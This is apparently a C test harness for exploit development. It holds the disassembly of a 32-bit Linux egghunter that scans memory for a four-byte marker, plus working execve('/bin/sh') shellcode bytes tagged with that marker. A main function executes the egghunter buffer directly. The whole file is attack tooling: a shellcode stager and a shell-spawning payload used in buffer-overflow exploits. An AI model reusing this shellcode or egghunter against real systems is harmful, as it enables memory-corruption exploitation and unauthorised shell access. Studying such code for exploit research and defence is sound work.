/*
Egghunter shellcode tester
-------------------------------
  
  
Disassembly of section .text:

08048080 <_start>:
 8048080:   31 d2                   xor    edx,edx

08048082 <next_page>:
 8048082:   66 81 ca ff 0f          or     dx,0xfff

08048087 <next_addr>:
 8048087:   42                      inc    edx
 8048088:   8d 5a 04                lea    ebx,[edx+0x4]
 804808b:   6a 21                   push   0x21
 804808d:   58                      pop    eax
 804808e:   cd 80                   int    0x80
 8048090:   3c f2                   cmp    al,0xf2
 8048092:   74 ee                   je     8048082 <next_page>
 8048094:   b8 90 50 90 50          mov    eax,0x50905090
 8048099:   89 d7                   mov    edi,edx
 804809b:   af                      scas   eax,DWORD PTR es:[edi]
 804809c:   75 e9                   jne    8048087 <next_addr>
 804809e:   af                      scas   eax,DWORD PTR es:[edi]
 804809f:   75 e6                   jne    8048087 <next_addr>
 80480a1:   ff e7                   jmp    edi
 
*/

#include <stdio.h>
#include <string.h>

#define     EGG     "<EGG>"

unsigned char sled[] = "Some misc bytes here";
unsigned char egghunter[] = 
        "<EGGHUNTER>";
unsigned char garbage[] = "Garbage, mangled bytes, whatever";
// execve(/bin/sh,..) shellcode here 
unsigned char shellcode[] = EGG EGG
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
                "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Function pointer
typedef int (*func_ptr)();

void main() {
    printf("Egghunter length: %d bytes\n", strlen(egghunter));
    printf("Shellcode Length:  %d bytes\n", strlen(shellcode));

    ((func_ptr) egghunter)();
}